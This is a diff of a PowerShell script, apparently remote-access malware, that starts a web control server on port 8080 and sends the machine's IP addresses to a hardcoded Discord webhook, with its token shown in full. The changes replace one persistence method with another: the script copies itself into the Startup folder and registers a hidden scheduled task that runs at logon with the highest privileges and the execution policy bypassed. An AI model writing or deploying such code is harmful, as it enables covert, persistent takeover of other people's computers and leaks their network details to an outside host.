@@ -1,4 +1,4 @@
-# Remote Web Control Server - Fixed Version
+# Remote Web Control Server
 $webhook = "https://discord.com/api/webhooks/1462473064397672664/EGBQMFQBUQoXW7tk5frXJlkxFmSDln9vDIaZt4lGTXdzQ0xMyIG9WWpqI-EF7ipRt49O"
 $port = 8080
 
@@ -28,8 +28,8 @@ $ips += "127.0.0.1"
 
 # Send IP info to Discord
 try {
-    $ipList = $ips -join "`n"
-    $body = @{content="Web server started! Access URLs:`n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
+    $ipList = $ips -join "\n"
+    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
 } catch {
     # If Discord fails, continue anyway
@@ -276,38 +276,26 @@ IPs: $($ips -join ', ')
     $response.Close()
 }
 
-# Persistence - restart if closed
-$scriptPath = "$env:TEMP\web_remote.ps1"
-if (!(Test-Path $scriptPath)) {
-    # Save script to temp for persistence
-    [System.IO.File]::WriteAllText($scriptPath, (Get-Content $PSCommandPath))
+# Add to startup for persistence
+try {
+    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+    $scriptPath = "$startupPath\web_remote.ps1"
+    Copy-Item $PSCommandPath $scriptPath -Force
+    
+    # Create scheduled task for additional persistence
+    $taskName = "WebRemote"
+    $taskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $scriptPath"
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Force -RunLevel Highest
+} catch {
+    # Continue even if persistence fails
 }
 
-# Create persistence service
-$serviceName = "WebRemote"
-if (!(Get-Service $serviceName -ErrorAction SilentlyContinue)) {
-    try {
-        # Create a simple service that restarts our script
-        $serviceScript = @'
-# Service to restart web server
-while ($true) {
-    Start-Sleep -Seconds 5
-    try {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`""
-    } catch {
-        Start-Sleep -Seconds 10
+# Keep server running indefinitely
+try {
+    while ($true) {
+        Start-Sleep -Seconds 1
     }
-}
-'@
-        $serviceScriptPath = "$env:TEMP\web_service.ps1"
-        [System.IO.File]::WriteAllText($serviceScriptPath, $serviceScript)
-        
-        # Install as scheduled task (more reliable than service)
-        $action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$serviceScriptPath`""
-        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
-        Register-ScheduledTask -TaskName "WebRemoteRestarter" -Action $action -Trigger $trigger -RunLevel Highest -Force
-    } catch {
-        # Fallback: create simple restart loop
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-Command `"while (`$true) { Start-Sleep -Seconds 10; try { Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File `"$scriptPath`"" } catch { Start-Sleep -Seconds 5 } }`""
-    }
+} catch {
+    $listener.Stop()
 }
